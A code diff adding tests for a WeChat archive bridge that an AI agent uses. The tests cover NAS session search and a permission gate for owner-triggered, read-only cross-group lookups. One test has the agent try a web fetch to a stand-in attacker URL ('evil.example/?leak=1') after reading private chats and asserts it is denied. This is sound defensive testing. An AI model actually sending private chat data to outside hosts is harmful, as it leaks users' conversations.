@@ -19,14 +19,20 @@ import { Automation, validatePolicy } from '../src/automation.js';
 import { Store } from '../src/core.js';
 import {
   DEFAULT_NAS_ARCHIVE_URL,
+  MAX_NAS_SEARCH_LIMIT,
+  OWNER_GROUP_CROSS_READ_TOOLS,
   WXARC_PROACTIVE_SEND_TOOL,
   WxarcBridgeSecurityError,
   apply,
+  assertOwnerToolAuthorized,
   createNasVaultProvider,
   createWechatSendSink,
   createWechatTargetDirectoryProvider,
   createWechatVaultProvider,
+  isOwnerGroupAtMentionTurn,
+  listNasSessions,
   registerWechatSendTool,
+  resolveNasSessions,
   resolveWechatVaultCircle,
   searchNasArchive,
 } from '../src/index.js';
@@ -695,4 +701,503 @@ test('Single-owner controllerId convergence, legacy adminIds[0] fallback, approv
 
   const articleMsg = received.find((m) => m.localType === 49)!;
   assert.match(articleMsg.articleSummary || '', /架构周报/);
+});
+
+test('NAS archive search & VaultProvider(nas): fuzzy session resolution with 60s cache, empty-query time pagination, no-match isolation, and local archive filtering', async (t) => {
+  assert.equal(MAX_NAS_SEARCH_LIMIT, 50);
+  await assert.rejects(() => searchNasArchive({}), TypeError);
+
+  const nasDir = mkdtempSync(join(tmpdir(), 'wxarc-nas-fuzzy-'));
+  t.after(() => rmSync(nasDir, { recursive: true, force: true }));
+  writeFileSync(join(nasDir, '访问密码.txt'), '访问密码：dummy-pass-123\n');
+
+  const sessionsPayload = [
+    { session: '990001@chatroom', name: '测试星球群', count: 120, last_ts: 1764244800 },
+    { session: '990002@chatroom', name: '虚拟闲聊群', count: 80, last_ts: 1764244000 },
+    { session: 'wxid_demo_peer', name: '测试好友', count: 30, last_ts: 1764243000 },
+  ];
+
+  const resolvedDirect = resolveNasSessions(
+    sessionsPayload.map((s) => ({ session: s.session, name: s.name, count: s.count, lastTs: s.last_ts })),
+    '测试 星球群',
+  );
+  assert.equal(resolvedDirect.length, 1);
+  assert.equal(resolvedDirect[0].session, '990001@chatroom');
+
+  let sessionsFetches = 0;
+  const messageRequests: string[] = [];
+  const tNov28 = Math.floor(Date.parse('2026-11-28T09:00:00+08:00') / 1000);
+  const tNov27Late = Math.floor(Date.parse('2026-11-27T20:30:00+08:00') / 1000);
+  const tNov27Mid = Math.floor(Date.parse('2026-11-27T14:15:00+08:00') / 1000);
+  const tNov26 = Math.floor(Date.parse('2026-11-26T18:00:00+08:00') / 1000);
+
+  const mockFetcher = async (url: string) => {
+    if (url.endsWith('/api/login')) {
+      return {
+        status: 200,
+        ok: true,
+        headers: { get: (k: string) => (k.toLowerCase() === 'set-cookie' ? 'sid=ok; Path=/' : null) },
+        json: async () => ({ ok: true }),
+      };
+    }
+    if (url.endsWith('/api/sessions')) {
+      sessionsFetches += 1;
+      return {
+        status: 200,
+        ok: true,
+        text: async () => JSON.stringify(sessionsPayload),
+        json: async () => sessionsPayload,
+      };
+    }
+    if (url.includes('/api/messages')) {
+      messageRequests.push(url);
+      const parsed = new URL(url);
+      const sessionParam = parsed.searchParams.get('session');
+      const beforeParam = parsed.searchParams.get('before');
+      assert.equal(sessionParam, '990001@chatroom');
+      if (!beforeParam) {
+        const page1 = {
+          messages: [
+            { id: 301, session: '990001@chatroom', sender: '成员甲', text: '今天早上的新话题', ts: tNov28 },
+            { id: 300, session: '990001@chatroom', sender: '成员乙', text: '昨天晚上讨论了旅行计划', ts: tNov27Late },
+          ],
+          next: 'cursor-page-2',
+        };
+        return { status: 200, ok: true, text: async () => JSON.stringify(page1), json: async () => page1 };
+      }
+      if (beforeParam === 'cursor-page-2') {
+        const page2 = {
+          messages: [
+            { id: 299, session: '990001@chatroom', sender: '成员丙', text: '昨天下午定了周末出发时间', ts: tNov27Mid },
+            { id: 298, session: '990001@chatroom', sender: '成员甲', text: '前天的旧消息不应返回', ts: tNov26 },
+          ],
+          next: 'cursor-page-3',
+        };
+        return { status: 200, ok: true, text: async () => JSON.stringify(page2), json: async () => page2 };
+      }
+      throw new Error('Should have stopped paginating after seeing items older than since');
+    }
+    throw new Error(`Unexpected URL: ${url}`);
+  };
+
+  const paged = await searchNasArchive(
+    {
+      session: '测试 星球群',
+      since: '2026-11-27',
+      until: '2026-11-27',
+      limit: 20,
+    },
+    { baseUrl: 'http://198.51.100.20:28787', archivePath: nasDir, fetcher: mockFetcher },
+  );
+  assert.equal(sessionsFetches, 1);
+  assert.equal(messageRequests.length, 2);
+  assert.match(messageRequests[0], /session=990001%40chatroom/);
+  assert.match(messageRequests[1], /before=cursor-page-2/);
+  assert.equal(paged.count, 2);
+  assert.deepEqual(
+    paged.items.map((item) => item.text),
+    ['昨天晚上讨论了旅行计划', '昨天下午定了周末出发时间'],
+  );
+  assert.equal(paged.items[0].sessionName, '测试星球群');
+
+  const noMatch = await searchNasArchive(
+    { session: '完全不存在的群聊名', since: '2026-11-27' },
+    { baseUrl: 'http://198.51.100.20:28787', archivePath: nasDir, fetcher: mockFetcher },
+  );
+  assert.equal(sessionsFetches, 1);
+  assert.equal(messageRequests.length, 2);
+  assert.equal(noMatch.count, 0);
+  assert.deepEqual(noMatch.items, []);
+
+  const cachedSessions = await listNasSessions({
+    baseUrl: 'http://198.51.100.20:28787',
+    archivePath: nasDir,
+    fetcher: mockFetcher,
+  });
+  assert.equal(sessionsFetches, 1);
+  assert.equal(cachedSessions.length, 3);
+
+  const hub = createTestHub(t);
+  hub.registerSessionPrincipal({ sessionId: 'owner-nas-vault', role: 'owner_session', tier: 3, trustLevel: 'owner' });
+  hub.registerVaultProvider(
+    createNasVaultProvider({
+      getConfig: () => ({ baseUrl: 'http://198.51.100.20:28787', archivePath: nasDir }),
+      getWardrobe: () => ({ resolveVaultVisibility: () => 'family' }),
+      fetcher: mockFetcher,
+    }),
+  );
+
+  const vaultByRoom = await hub.vault.search(
+    { query: '', sources: ['nas'], roomKey: 'wechat:990001@chatroom', since: '2026-11-27', until: '2026-11-27' },
+    { agent: { id: 'owner-nas-vault' } },
+  );
+  assert.equal(vaultByRoom.hits.length, 2);
+  assert.equal(vaultByRoom.hits[0].roomKey, 'wechat:990001@chatroom');
+
+  const vaultByGroupNameInPerson = await hub.vault.search(
+    { query: '', sources: ['nas'], person: '测试 星球群', since: '2026-11-27', until: '2026-11-27' },
+    { agent: { id: 'owner-nas-vault' } },
+  );
+  assert.equal(vaultByGroupNameInPerson.hits.length, 2);
+  assert.equal(vaultByGroupNameInPerson.hits[0].roomName, '测试星球群');
+
+  const localDbPath = join(nasDir, 'local-time.sqlite');
+  const localDb = new DatabaseSync(localDbPath);
+  localDb.exec(
+    'CREATE TABLE messages(id INTEGER PRIMARY KEY, session TEXT, session_name TEXT, sender TEXT, sender_id TEXT, text TEXT, ts INTEGER)',
+  );
+  localDb.prepare('INSERT INTO messages VALUES (?,?,?,?,?,?,?)').run(1, '990001@chatroom', '测试星球群', '成员甲', 'wxid_a', '前天消息', tNov26);
+  localDb.prepare('INSERT INTO messages VALUES (?,?,?,?,?,?,?)').run(2, '990001@chatroom', '测试星球群', '成员乙', 'wxid_b', '昨天讨论', tNov27Mid);
+  localDb.prepare('INSERT INTO messages VALUES (?,?,?,?,?,?,?)').run(3, '990002@chatroom', '虚拟闲聊群', '成员丙', 'wxid_c', '另一群昨天', tNov27Late);
+  localDb.close();
+
+  const localFiltered = await searchNasArchive(
+    { session: '测试 星球群', since: '2026-11-27', until: '2026-11-27' },
+    { archivePath: localDbPath },
+  );
+  assert.equal(localFiltered.count, 1);
+  assert.equal(localFiltered.items[0].text, '昨天讨论');
+
+  const localMiss = await searchNasArchive(
+    { session: '幽灵群名' },
+    { archivePath: localDbPath },
+  );
+  assert.equal(localMiss.count, 0);
+});
+
+test('Owner group @-mention grants single-turn read-only cross-group access, exempts confirmation, blocks web_fetch after read, and revokes on turn end', async (t) => {
+  const dir = mkdtempSync(join(tmpdir(), 'wxarc-owner-group-crossread-'));
+  const store = new Store(dir);
+  const hub = createTestHub(t);
+
+  store.commit(
+    'text',
+    0,
+    [
+      {
+        id: 1,
+        kind: 'text',
+        session: '990001@chatroom',
+        session_name: '测试星球群',
+        sender: '成员甲',
+        text: '昨天大家约好周六去爬山',
+        ts: Math.floor(Date.parse('2026-11-27T15:00:00+08:00') / 1000),
+        local_type: 1,
+      },
+    ],
+    1000,
+  );
+
+  hub.registerVaultProvider(
+    createWechatVaultProvider({
+      db: store.db,
+      getWardrobe: () => ({ resolveVaultVisibility: () => 'family' }),
+    }),
+  );
+
+  const hooks: Record<string, (...args: any[]) => any> = {};
+  const agents = new Map<string, any>();
+  const makeAgent = (id: string, cwd: string) => {
+    const a: any = {
+      id,
+      cwd,
+      session: { header: { delegationDepth: 0, origin: 'user' } },
+      inbox: { clear() {} },
+      model: { select() {} },
+      whenIdle: async () => {},
+      cancel() {},
+      busy: false,
+    };
+    agents.set(id, a);
+    return a;
+  };
+  const emit = (id: string, type: string, data: Record<string, any>) =>
+    hooks['session/event']?.({ id }, { type, data });
+
+  const ctx: any = {
+    on: (type: string, fn: (...args: any[]) => any) => {
+      hooks[type] = fn;
+      return () => {
+        delete hooks[type];
+      };
+    },
+    systemPrompt: { section: () => () => {} },
+    agents: { get: (id: string) => agents.get(id) },
+    approval: { setPolicy() {} },
+    permissionPresets: { set() {} },
+    llm: {
+      resolveCallConfig: async () => ({}),
+      resolveModelInfo: async () => ({ inputModalities: ['text'] }),
+    },
+    workspaceController: { create: async () => ({ created: false, workspace: { workspaceId: 'ws' } }) },
+    workspaceRegistry: { get: () => ({ attachSession: async () => {} }) },
+    sessionController: {
+      resolveAgent: async (id: string) =>
+        agents.has(id) ? { agent: agents.get(id) } : { error: { code: 'session/not-found' } },
+      create: async ({ sessionId, cwd }: { sessionId: string; cwd: string }) => {
+        const a = makeAgent(sessionId, cwd);
+        hooks['agent/created']?.({ agent: a });
+        return { sessionId };
+      },
+      rename: async () => {},
+      state: async ({ sessionId }: { sessionId: string }) => ({
+        running: agents.get(sessionId)?.busy || false,
+        queue: [],
+        pendingInput: [],
+      }),
+      prompt: async (req: Record<string, any>) => {
+        agents.get(req.sessionId).busy = true;
+        emit(req.sessionId, 'user/message', { source: { kind: 'user', rpcId: req.requestId } });
+        emit(req.sessionId, 'turn/start', { turn: 1 });
+      },
+    },
+  };
+
+  const policy = {
+    ownId: 'wxid_bot',
+    controllerId: 'wxid_owner',
+    adminIds: [],
+    provider: 'test',
+    model: 'test',
+    personaId: 'p1',
+    instructions: '自然回复',
+  };
+
+  const bridge = new AgentBridge(ctx, store, {
+    root: join(dir, 'work'),
+    personas: { context: () => ({ name: '小助手', memory: [] }) },
+    hub,
+    isRouterManagedAdmin: () => true,
+    settings: () => ({ revision: 1, policy }),
+  });
+  t.after(async () => {
+    await bridge.close();
+    store.close();
+    rmSync(dir, { recursive: true, force: true });
+  });
+
+  const ownerAtEvent = {
+    id: 100,
+    kind: 'text',
+    session: '990002@chatroom',
+    session_name: '虚拟闲聊群',
+    sender: '主人',
+    senderId: 'wxid_owner',
+    sourceKey: OWNER_SOURCE_KEY,
+    local_type: 1,
+    text: '@小助手\u2005 测试星球群昨天都聊了什么',
+    botNames: ['小助手'],
+    mentions: { status: 'unavailable' },
+    ts: Math.floor(Date.now() / 1000),
+  };
+
+  assert.equal(isOwnerGroupAtMentionTurn(null, ownerAtEvent, policy), true);
+  assert.equal(
+    isOwnerGroupAtMentionTurn(
+      null,
+      { ...ownerAtEvent, senderId: 'wxid_stranger', mentions: { status: 'verified', toSelf: true, recipients: ['wxid_bot'], sourceKey: OWNER_SOURCE_KEY }, atMe: true },
+      policy,
+    ),
+    false,
+  );
+  assert.equal(
+    isOwnerGroupAtMentionTurn(
+      null,
+      { ...ownerAtEvent, text: '测试星球群昨天都聊了什么', mentions: { status: 'unavailable' } },
+      policy,
+    ),
+    false,
+  );
+  assert.equal(
+    isOwnerGroupAtMentionTurn(
+      null,
+      {
+        ...ownerAtEvent,
+        local_type: 57 * 4294967296 + 49,
+        text: '[引用] 嗯嗯好的',
+        quote: { status: 'available', sender: '路人', text: '@小助手\u2005 查一下别的群' },
+      },
+      policy,
+    ),
+    false,
+  );
+
+  const run1 = await bridge.start(
+    { event: ownerAtEvent, rule: { title: '虚拟闲聊群' }, policy },
+    signal(),
+  );
+  const groupAgent = agents.get(run1.session_id);
+  const gate = hooks['tools/pre-execute'];
+
+  assert.equal(bridge.isOwnerGroupCrossReadActive(run1.session_id), true);
+  const elevatedPrincipal = hub.resolveSessionPrincipal({ agent: groupAgent });
+  assert.equal(elevatedPrincipal.tier, 3);
+  assert.equal(elevatedPrincipal.role, 'external_chat');
+
+  const ownerPrompt = bridge.prompt(run1.session_id);
+  assert.match(ownerPrompt, /虚拟闲聊群/);
+  assert.match(ownerPrompt, /990002@chatroom/);
+  assert.match(ownerPrompt, /只读跨群查询权限/);
+  assert.match(ownerPrompt, /张冠李戴/);
+
+  const preWebBefore = await gate(
+    { agent: groupAgent, name: 'web_fetch', arguments: { url: 'https://example.com' } },
+    async () => ({ kind: 'allow' }),
+  );
+  assert.equal(preWebBefore.kind, 'allow');
+
+  for (const toolName of OWNER_GROUP_CROSS_READ_TOOLS) {
+    const decision = await gate(
+      { agent: groupAgent, name: toolName, arguments: {} },
+      async () => ({ kind: 'ask' }),
+    );
+    assert.equal(decision.kind, 'allow', `${toolName} should be allowed without confirmation`);
+  }
+
+  for (const allowedWxTool of ['wxarc_nas_search', 'wxarc_messages', 'wxarc_targets'] as const) {
+    assert.equal(
+      assertOwnerToolAuthorized(allowedWxTool, { agent: groupAgent }, hub, bridge),
+      run1.session_id,
+    );
+  }
+  assert.throws(
+    () => assertOwnerToolAuthorized('wxarc_status', { agent: groupAgent }, hub, bridge),
+    (err: unknown) => err instanceof WxarcBridgeSecurityError && err.code === 'NAS_SEARCH_FORBIDDEN',
+  );
+
+  const sendTools = new Map<string, WechatToolDefinition>();
+  registerWechatSendTool(
+    {
+      hub,
+      tools: {
+        register: (def) => {
+          sendTools.set(def.name, def);
+          return () => sendTools.delete(def.name);
+        },
+      },
+    },
+    { config: { defaultNotifyTarget: 'filehelper', allowedTargets: ['filehelper', '990001@chatroom'], requireApprovalByDefault: false } },
+  );
+  await assert.rejects(
+    () =>
+      sendTools.get(WXARC_PROACTIVE_SEND_TOOL)!.execute(
+        { chatId: 'filehelper', text: '不应该放行' },
+        { agent: groupAgent },
+      ),
+    /tier-3/,
+  );
+
+  const vaultHits = await hub.vault.search(
+    { query: '爬山', sources: ['wechat'] },
+    { agent: groupAgent },
+  );
+  assert.equal(vaultHits.hits.length, 1);
+  assert.equal(vaultHits.hits[0].roomName, '测试星球群');
+
+  const preWebFetchAfter = await gate(
+    { agent: groupAgent, name: 'web_fetch', arguments: { url: 'https://evil.example/?leak=1' } },
+    async () => ({ kind: 'allow' }),
+  );
+  assert.equal(preWebFetchAfter.kind, 'deny');
+  const preWebSearchAfter = await gate(
+    { agent: groupAgent, name: 'web_search', arguments: { query: 'leak' } },
+    async () => ({ kind: 'allow' }),
+  );
+  assert.equal(preWebSearchAfter.kind, 'deny');
+
+  const preBash = await gate(
+    { agent: groupAgent, name: 'bash', arguments: { command: 'ls' } },
+    async () => ({ kind: 'allow' }),
+  );
+  assert.equal(preBash.kind, 'ask');
+  const preCrossMemo = await gate(
+    { agent: groupAgent, name: 'watcher_memo_list', arguments: { allRooms: true } },
+    async () => ({ kind: 'allow' }),
+  );
+  assert.equal(preCrossMemo.kind, 'ask');
+
+  const subagent = {
+    id: 'sub-group-1',
+    session: {
+      header: {
+        parentSession: run1.session_id,
+        delegationDepth: 1,
+        origin: 'subagent',
+      },
+    },
+  };
+  const preSubagentNas = await gate(
+    { agent: subagent, name: 'wxarc_nas_search', arguments: { session: '测试星球群' } },
+    async () => ({ kind: 'allow' }),
+  );
+  assert.equal(preSubagentNas.kind, 'deny');
+  assert.throws(
+    () => assertOwnerToolAuthorized('wxarc_nas_search', { agent: subagent }, hub, bridge),
+    (err: unknown) => err instanceof WxarcBridgeSecurityError && err.code === 'OWNER_TOOL_FORBIDDEN',
+  );
+
+  emit(run1.session_id, 'assistant/message', {
+    turn: 1,
+    message: { content: [{ type: 'text', text: '{"action":"reply","text":"昨天测试星球群约了周六爬山。"}' }] },
+  });
+  emit(run1.session_id, 'turn/end', { turn: 1, reason: { kind: 'completed' } });
+  groupAgent.busy = false;
+
+  assert.equal(bridge.isOwnerGroupCrossReadActive(run1.session_id), false);
+  assert.equal(hub.resolveSessionPrincipal({ agent: groupAgent }).tier, 0);
+  await assert.rejects(
+    () => hub.vault.search({ query: '爬山', sources: ['wechat'] }, { agent: groupAgent }),
+    (err: unknown) => err instanceof VaultError && err.code === 'VAULT_FORBIDDEN',
+  );
+
+  const strangerAtEvent = {
+    ...ownerAtEvent,
+    id: 101,
+    sender: '群友路人',
+    senderId: 'wxid_stranger',
+    mentions: {
+      status: 'verified',
+      sourceKey: OWNER_SOURCE_KEY,
+      recipients: ['wxid_bot'],
+      toSelf: true,
+    },
+  };
+  const run2 = await bridge.start(
+    { event: strangerAtEvent, rule: { title: '虚拟闲聊群' }, policy },
+    signal(),
+  );
+  assert.equal(bridge.isOwnerGroupCrossReadActive(run2.session_id), false);
+  assert.equal(hub.resolveSessionPrincipal({ agent: groupAgent }).tier, 0);
+  for (const toolName of OWNER_GROUP_CROSS_READ_TOOLS) {
+    const decision = await gate(
+      { agent: groupAgent, name: toolName, arguments: {} },
+      async () => ({ kind: 'allow' }),
+    );
+    assert.equal(decision.kind, 'deny', `${toolName} must be denied for non-owner @ mention`);
+  }
+  const strangerPrompt = bridge.prompt(run2.session_id);
+  assert.match(strangerPrompt, /虚拟闲聊群/);
+  assert.match(strangerPrompt, /无权查看其他微信群或私聊/);
+  assert.match(strangerPrompt, /张冠李戴/);
+
+  bridge.cancel(run2.id, 'done-stranger');
+  groupAgent.busy = false;
+
+  const ownerNoAtEvent = {
+    ...ownerAtEvent,
+    id: 102,
+    text: '测试星球群昨天聊啥了',
+    mentions: { status: 'unavailable' },
+  };
+  const run3 = await bridge.start(
+    { event: ownerNoAtEvent, rule: { title: '虚拟闲聊群' }, policy },
+    signal(),
+  );
+  assert.equal(bridge.isOwnerGroupCrossReadActive(run3.session_id), false);
+  assert.equal(hub.resolveSessionPrincipal({ agent: groupAgent }).tier, 0);
+  const preOwnerNoAt = await gate(
+    { agent: groupAgent, name: 'wxarc_nas_search', arguments: { session: '测试星球群' } },
+    async () => ({ kind: 'allow' }),
+  );
+  assert.equal(preOwnerNoAt.kind, 'deny');
 });
